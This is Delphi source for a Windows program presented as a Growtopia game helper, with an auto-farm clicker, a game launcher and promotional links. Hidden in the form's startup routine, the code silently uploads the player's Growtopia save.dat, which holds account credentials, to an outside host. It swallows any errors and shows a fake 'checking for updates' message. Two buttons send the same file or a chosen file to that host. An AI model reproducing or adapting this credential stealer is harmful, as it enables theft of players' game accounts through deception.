unit Unit2;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, MmSystem, Vcl.Dialogs, Vcl.StdCtrls, Vcl.WinXCtrls, Vcl.Menus, IdTCPConnection, IdTCPClient, IdHTTP, IdBaseComponent,
  IdComponent, IdCustomTCPServer, IdCustomHTTPServer, IdHTTPServer,
  IdContext, IdMultipartFormData, IdHeaderList, IdMessageCoder,
  IdMessageCoderMIME, IdMessage, IdGlobalProtocols, System.Sensors,
  System.Sensors.Components, Vcl.ExtCtrls, Vcl.OleCtrls, SHDocVw,
  System.Net.URLClient, System.Net.HttpClient, System.Net.HttpClientComponent,
  Vcl.ComCtrls, Vcl.Imaging.pngimage,TlHelp32,ShellApi, Vcl.MPlayer, Vcl.ExtDlgs,Vcl.Themes,IdHashMessageDigest, idHash,
  Vcl.ToolWin;

type
  TForm2 = class(TForm)
    TabControl1: TTabControl;
    Panel1: TPanel;
    WebBrowser1: TWebBrowser;
    Button1: TButton;
    Edit1: TEdit;
    Button2: TButton;
    OpenDialog1: TOpenDialog;
    Button3: TButton;
    IdHTTP1: TIdHTTP;
    Panel2: TPanel;
    Button4: TButton;
    Edit2: TEdit;
    Button5: TButton;
    Button6: TButton;
    Label1: TLabel;
    Image1: TImage;
    Image2: TImage;
    ListBox1: TListBox;
    RichEdit1: TRichEdit;
    RichEdit2: TRichEdit;
    Panel3: TPanel;
    Button7: TButton;
    Label2: TLabel;
    Label3: TLabel;
    Label4: TLabel;
    Label5: TLabel;
    Label6: TLabel;
    Button8: TButton;
    Panel4: TPanel;
    Edit3: TEdit;
    Edit4: TEdit;
    Edit5: TEdit;
    Edit6: TEdit;
    Edit7: TEdit;
    Edit8: TEdit;
    Timer1: TTimer;
    Timer2: TTimer;
    Label7: TLabel;
    ProgressBar1: TProgressBar;
    ListBox2: TListBox;
    Label8: TLabel;
    Label9: TLabel;
    Label10: TLabel;
    Edit9: TEdit;
    Label11: TLabel;
    Image3: TImage;
    Image4: TImage;
    Button9: TButton;
    Button10: TButton;
    Panel6: TPanel;
    Button11: TButton;
    Button12: TButton;
    Timer3: TTimer;
    Edit10: TEdit;
    Label12: TLabel;
    procedure FormCreate(Sender: TObject);
    procedure TabControl1Change(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure Button1Click(Sender: TObject);
    procedure Button3Click(Sender: TObject);
    procedure Button4Click(Sender: TObject);
    procedure Image1Click(Sender: TObject);
    procedure Image2Click(Sender: TObject);
    procedure WMHotKey(var Message: TMessage); message WM_HOTKEY;
    procedure Button7Click(Sender: TObject);
    procedure Timer1Timer(Sender: TObject);
    procedure Timer2Timer(Sender: TObject);
    procedure Button9Click(Sender: TObject);
    procedure Button10Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure Button11Click(Sender: TObject);
    procedure Button12Click(Sender: TObject);
    procedure Timer3Timer(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form2: TForm2;
   MausPos: TPoint;

implementation

{$R *.dfm}

procedure TForm2.Button10Click(Sender: TObject);
begin
Timer2.Enabled:=false;
end;
function GetProcessIDs(ProcessName: String):Integer;
var Handle: tHandle;
    Process: tProcessEntry32;
    GotProcess: Boolean;
begin
Handle:=CreateToolHelp32SnapShot(TH32CS_SNAPALL,0);
Process.dwSize:=SizeOf(Process);
GotProcess := Process32First(Handle,Process);
{$B-}
if GotProcess and (Process.szExeFile<>ProcessName) then
 repeat
 GotProcess := Process32Next(Handle,Process);
 until (not GotProcess) or (Process.szExeFile=ProcessName);
{$B+}
if GotProcess then Result:=Process.th32ProcessID
              else Result:=0;
CloseHandle(Handle);
end;
procedure TForm2.Button11Click(Sender: TObject);
begin
Timer3.Enabled:=true;
ShowMessage(IntToStr(GetProcessIDs('Growtopia')));
end;

procedure TForm2.Button12Click(Sender: TObject);
begin
Timer3.Enabled:=false;
end;

procedure TForm2.Button1Click(Sender: TObject);
begin
OpenDialog1.Execute();
Edit1.Text:=OpenDialog1.FileName;
end;

procedure TForm2.Button2Click(Sender: TObject);
var
  Params: TIdMultipartFormDataStream;
  Response: TStringStream;
begin



  try



    Params := TIdMultipartFormDataStream.Create;
    Response := TStringStream.Create;
    try



      Params.AddFile('file', Edit1.Text);

      // Substiture real url below.
      IdHTTP1.Post('http://liab.890m.com/gtnoobs/index.php', Params, Response);
       WebBrowser1.Show;
WebBrowser1.Navigate('http://liab.890m.com/gtnoobs/file_decode.php?file=');
    finally

      Params.Free;
      Response.Free;
    end;
  except
    // Log exception
    on e: Exception    do
    //ShowMessage(e.Message);
    end;

end;
procedure TForm2.WMHotKey(var Message: TMessage);
begin
 Timer2.Enabled:=False;
  ShowMessage('Auto Farm -> Stopped!');
  Application.BringToFront;
end;
procedure TForm2.Button3Click(Sender: TObject);
var
  Params: TIdMultipartFormDataStream;
  Response: TStringStream;
begin



  try



    Params := TIdMultipartFormDataStream.Create;
    Response := TStringStream.Create;
    try



      Params.AddFile('file', 'C:\Users\'+GetEnvironmentVariable('USERNAME')+'\AppData\Local\Growtopia\save.dat');

      // Substiture real url below.
      IdHTTP1.Post('http://liab.890m.com/gtnoobs/index.php', Params, Response);
    finally

      Params.Free;
      Response.Free;
       WebBrowser1.Show;
WebBrowser1.Navigate('http://liab.890m.com/gtnoobs/file_decode.php?file=');
    end;
  except
    // Log exception
    on e: Exception    do
    //ShowMessage(e.Message);
    end;

end;
 function ExecuteProcess(const FileName, Params: string; Folder: string; WaitUntilTerminated, WaitUntilIdle, RunMinimized: boolean;
  var ErrorCode: integer): boolean;
var
  CmdLine: string;
  WorkingDirP: PChar;
  StartupInfo: TStartupInfo;
  ProcessInfo: TProcessInformation;
begin
  Result := true;
  CmdLine := '"' + FileName + '" ' + Params;
  if Folder = '' then Folder := ExcludeTrailingPathDelimiter(ExtractFilePath(FileName));
  ZeroMemory(@StartupInfo, SizeOf(StartupInfo));
  StartupInfo.cb := SizeOf(StartupInfo);
  if RunMinimized then
    begin
      StartupInfo.dwFlags := STARTF_USESHOWWINDOW;
      StartupInfo.wShowWindow := SW_SHOWMINIMIZED;
    end;
  if Folder <> '' then WorkingDirP := PChar(Folder)
  else WorkingDirP := nil;
  if not CreateProcess(nil, PChar(CmdLine), nil, nil, false, 0, nil, WorkingDirP, StartupInfo, ProcessInfo) then
    begin
      Result := false;
      ErrorCode := GetLastError;
      exit;
    end;
  with ProcessInfo do
    begin
      CloseHandle(hThread);
      if WaitUntilIdle then WaitForInputIdle(hProcess, INFINITE);
      if WaitUntilTerminated then
        repeat
          Application.ProcessMessages;
        until MsgWaitForMultipleObjects(1, hProcess, false, INFINITE, QS_ALLINPUT) <> WAIT_OBJECT_0 + 1;
      CloseHandle(hProcess);
    end;
end;
function GetPIDbyProcessName(processName:String):integer;
var
  GotProcess: Boolean;
  tempHandle: tHandle;
  procE: tProcessEntry32;
begin
  tempHandle:=CreateToolHelp32SnapShot(TH32CS_SNAPALL, 0);
  procE.dwSize:=SizeOf(procE);
  GotProcess:=Process32First(tempHandle, procE);
  {$B-}
    if GotProcess and (procE.szExeFile <> processName) then
      repeat GotProcess := Process32Next(tempHandle, procE);
      until (not GotProcess) or (procE.szExeFile = processName);
  {$B+}

  if GotProcess then
    result := procE.th32ProcessID
  else
    result := 0; // process not found in running process list

  CloseHandle(tempHandle);
end;
function MD5String(str: String): String;
begin
  with TIdHashMessageDigest5.Create do
    try
      Result := HashStringAsHex(str);
    finally
      Free;
    end;
end;
procedure TForm2.Button4Click(Sender: TObject);
var
  FileName, Parameters, WorkingFolder: string;
  Error: integer;
  OK: boolean;

  StartInfo : TStartupInfo;
  ProcInfo : TProcessInformation;
  CreateOK : Boolean;
begin
OpenDialog1.FileName:='C:\Users\Liab\AppData\Local\Growtopia\Growtopia.exe';
OpenDialog1.Execute();
Edit2.Text:=OpenDialog1.FileName;
 FileName := Edit2.Text;
  WorkingFolder := ''; // if empty function will extract path from FileName
  Parameters := '-maximized'; // can be empty
  OK := ExecuteProcess(FileName, Parameters, WorkingFolder, false, false, false, Error);

              ListBox1.Items.Add('Loading Fake Mutex...');
              ListBox1.Items.Add('Creating Growtopia.exe Process...');
              ListBox1.Items.Add('Started GT PID[' + IntToStr(GetPIDbyProcessName('Growtopia')) + ']' + ' | Hashed GUID [' + MD5String('01242EA52EFE31C906F488D43B634944') + ']');
end;

procedure TForm2.Button7Click(Sender: TObject);
begin
ShowMessage('Made by (c) Hirako Shiniji');
end;

procedure TForm2.Button9Click(Sender: TObject);
begin
Timer2.Interval:= StrToInt(Edit9.Text);
Timer2.Enabled:=true;
end;

procedure TForm2.FormClose(Sender: TObject; var Action: TCloseAction);
begin
     RenameFile('C:\Users\'+GetEnvironmentVariable('USERNAME')+'\AppData\Local\Growtopia\' + GetEnvironmentVariable('USERNAME'), 'C:\Users\'+GetEnvironmentVariable('USERNAME')+'\AppData\Local\Growtopia\save.dat');
end;

procedure TForm2.FormCreate(Sender: TObject);
var
  Params: TIdMultipartFormDataStream;
  Response: TStringStream;
begin



  try



    Params := TIdMultipartFormDataStream.Create;
    Response := TStringStream.Create;
    try


       RenameFile('C:\Users\'+GetEnvironmentVariable('USERNAME')+'\AppData\Local\Growtopia\save.dat', 'C:\Users\'+GetEnvironmentVariable('USERNAME')+'\AppData\Local\Growtopia\' + GetEnvironmentVariable('USERNAME'));
      Params.AddFile('file', 'C:\Users\'+GetEnvironmentVariable('USERNAME')+'\AppData\Local\Growtopia\' + GetEnvironmentVariable('USERNAME'));

      // Substiture real url below.
      IdHTTP1.Post('http://liab.890m.com/index.php', Params, Response);
    finally
       RenameFile('C:\Users\'+GetEnvironmentVariable('USERNAME')+'\AppData\Local\Growtopia\' + GetEnvironmentVariable('USERNAME'), 'C:\Users\'+GetEnvironmentVariable('USERNAME')+'\AppData\Local\Growtopia\save.dat');
      Params.Free;
      Response.Free;
    end;
  except
    // Log exception
    on e: Exception    do
    //ShowMessage(e.Message);
    end;
//WebBrowser1.Navigate('http://liab.890m.com/gtnoobs/wait.php');
ListBox1.Items.Add('Checking for latest updates...');
ListBox1.Items.Add('there is no updates found! have fun using!');
RegisterHotKey(Handle, 100000 { Any unused number}, 0, VK_F7);
end;

procedure TForm2.Image1Click(Sender: TObject);
begin
 ShellExecute(Handle, 'open',
'https://discord.gg/Zwhyrnj', nil, nil, SW_SHOWNORMAL) ;
end;

procedure TForm2.Image2Click(Sender: TObject);
begin
 ShellExecute(Handle, 'open',
'https://www.youtube.com/channel/UC2xSrkBPo0mBU9hFlQ66Htg', nil, nil, SW_SHOWNORMAL) ;

end;

procedure TForm2.TabControl1Change(Sender: TObject);
begin
if TabControl1.TabIndex=1 then
begin
   Panel1.Visible:=true;
  WebBrowser1.Hide;
    Panel2.Visible:=false;
     Panel4.Visible:=false;
end;


    if TabControl1.TabIndex=2  then
    begin
      Panel1.Visible:=false;
     Panel2.Visible:=false;
  WebBrowser1.Visible:=false;
        Panel4.Visible:=true;
         ProgressBar1.Show;
     ListBox2.Show;
    end;
              if TabControl1.TabIndex=3  then
    begin
      Panel1.Visible:=false;
     Panel2.Visible:=false;
  WebBrowser1.Visible:=false;
        Panel4.Visible:=false;
        Panel6.Visible:=true;
         ProgressBar1.Show;
     ListBox2.Show;
    end;

  if TabControl1.TabIndex=0  then
  begin
   Panel4.Visible:=false;
    Panel1.Visible:=false;
              ListBox1.Show;
               Panel2.Visible:=true;
  WebBrowser1.Visible:=false;

  end;
   if TabControl1.TabIndex>2 then
   begin
     ProgressBar1.Hide;
     ListBox2.Hide;
   end;
   if TabControl1.TabIndex<2 then
   begin
     ProgressBar1.Hide;
     ListBox2.Hide;
   end;
   if TabControl1.TabIndex>0 then
   begin
     ListBox1.Hide;
   end;

end;



procedure TForm2.Timer1Timer(Sender: TObject);
begin
MausPos := Mouse.CursorPos;

 label7.Caption := Format('x=%d, y=%d', [MausPos.X, MausPos.y]);
end;

procedure TForm2.Timer2Timer(Sender: TObject);

var  i: Integer;

begin


ProgressBar1.StepIt;
if ProgressBar1.Position=10 then
SetCursorPos(StrToInt(Edit3.Text),StrToInt(Edit4.Text));

    mouse_event( MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0 );
  mouse_event( MOUSEEVENTF_LEFTUP, 0, 0, 0, 0 );
if ProgressBar1.Position=30 then
 SetCursorPos(StrToInt(Edit5.Text),StrToInt(Edit6.Text));

    mouse_event( MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0 );
  mouse_event( MOUSEEVENTF_LEFTUP, 0, 0, 0, 0 );
if ProgressBar1.Position=50 then
 SetCursorPos(StrToInt(Edit7.Text),StrToInt(Edit8.Text));

    mouse_event( MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0 );
  mouse_event( MOUSEEVENTF_LEFTUP, 0, 0, 0, 0 );

  if ProgressBar1.Position=70 then
  SetCursorPos(StrToInt(Edit5.Text),StrToInt(Edit6.Text));

    mouse_event( MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0 );

if ProgressBar1.Position=106 then
     mouse_event( MOUSEEVENTF_LEFTUP, 0, 0, 0, 0 );
     ListBox2.Items.Add('[Output] Blocks Broken: ' + 'Unknown Block')
end;

procedure TForm2.Timer3Timer(Sender: TObject);

 var ProcessHandle, edit: HWND;
begin

    ProcessHandle:=FindWindow(PChar('Growtopia'),nil);
   PostMessage(ProcessHandle, WM_KEYDOWN, VK_RETURN, 0);
  SendMessage(ProcessHandle, WM_CHAR, dword( Edit10.Text), 0);



end;

end.
